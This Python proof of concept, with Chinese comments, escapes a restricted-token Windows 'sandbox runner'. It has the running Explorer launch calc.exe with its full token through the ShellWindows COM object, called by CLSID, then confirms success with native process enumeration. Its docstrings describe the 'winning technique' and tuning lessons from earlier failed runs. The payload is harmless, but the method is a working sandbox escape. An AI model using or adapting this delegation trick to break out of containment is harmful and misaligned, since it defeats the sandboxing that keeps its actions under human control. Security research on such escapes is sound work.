#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""[BENIGN RESEARCH PROBE] 经运行中 Explorer(完整令牌)委托拉起计算器 —— 制胜技术。

同样在沙箱 runner 下运行。要点：
1. ProgID 在受限令牌下解析为全零 CLSID，必须 [Type]::GetTypeFromCLSID 直连
2. UWP 激活经委托路径约需 7 秒，轮询判断至少等 15 秒（我们第一轮 6 秒轮询误判过失败）
3. 探测器不能用 tasklist/wmic：沙箱令牌丢弃 Authenticated Users 后 WMI 全线
   "拒绝访问"，进程可见必须走原生 EnumProcesses（2026-08-31 实测修正）
"""
import datetime
import getpass
import os
import subprocess
import time

LOG = os.path.join(os.path.dirname(os.path.abspath(__file__)), "TRIGGER_LOG.txt")

PS = "$t=[Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39');" \
     "$sw=[Activator]::CreateInstance($t);" \
     "$sw.Item(0).Document.Application.ShellExecute('calc.exe','','','open',1)"


def log(tag, msg):
    with open(LOG, "a", encoding="utf-8") as f:
        f.write("[%s] %s user=%s %s\n" % (tag, datetime.datetime.now().isoformat(timespec="seconds"), getpass.getuser(), msg))


def calc_pids():
    """返回 CalculatorApp.exe 的 PID 列表。

    必须用原生 API（psapi.EnumProcesses）：DSH windows-acl 沙箱令牌丢弃
    Authenticated Users，WMI 命名空间检查失败，tasklist/wmic 在沙箱内一律
    "拒绝访问"（2026-08-31 实测）——用 tasklist 做探测器会把成功判成失败。
    """
    import ctypes
    from ctypes import wintypes

    psapi = ctypes.WinDLL("psapi")
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    psapi.EnumProcesses.argtypes = [ctypes.POINTER(ctypes.c_uint), ctypes.c_uint, ctypes.POINTER(ctypes.c_uint)]
    kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
    kernel32.OpenProcess.restype = wintypes.HANDLE
    kernel32.QueryFullProcessImageNameW.argtypes = [wintypes.HANDLE, wintypes.DWORD, wintypes.LPWSTR, ctypes.POINTER(wintypes.DWORD)]
    kernel32.CloseHandle.argtypes = [wintypes.HANDLE]

    array = (ctypes.c_uint * 4096)()
    needed = ctypes.c_uint()
    if not psapi.EnumProcesses(array, ctypes.sizeof(array), ctypes.byref(needed)):
        raise OSError("EnumProcesses failed")
    pids = []
    for pid in array[: needed.value // ctypes.sizeof(ctypes.c_uint)]:
        if pid == 0:
            continue
        handle = kernel32.OpenProcess(0x1000, False, pid)  # PROCESS_QUERY_LIMITED_INFORMATION
        if not handle:
            continue
        try:
            buf = ctypes.create_unicode_buffer(512)
            size = wintypes.DWORD(512)
            if kernel32.QueryFullProcessImageNameW(handle, 0, buf, ctypes.byref(size)) \
                    and buf.value.endswith("CalculatorApp.exe"):
                pids.append(pid)
        finally:
            kernel32.CloseHandle(handle)
    return pids


def main():
    log("DELEGATION", "issuing")
    subprocess.run(["powershell", "-NoProfile", "-Command", PS], capture_output=True, timeout=60)
    for i in range(30):  # 15 秒轮询：UWP 委托激活需要 ~7 秒
        pids = calc_pids()
        if pids:
            log("DELEGATION", "CALC ALIVE after %ds pids=%s" % (i // 2, pids))
            print("calculator alive: %s" % pids)
            return
        time.sleep(0.5)
    log("DELEGATION", "no calc after 15s")
    print("no CalculatorApp.exe after 15s")


if __name__ == "__main__":
    main()
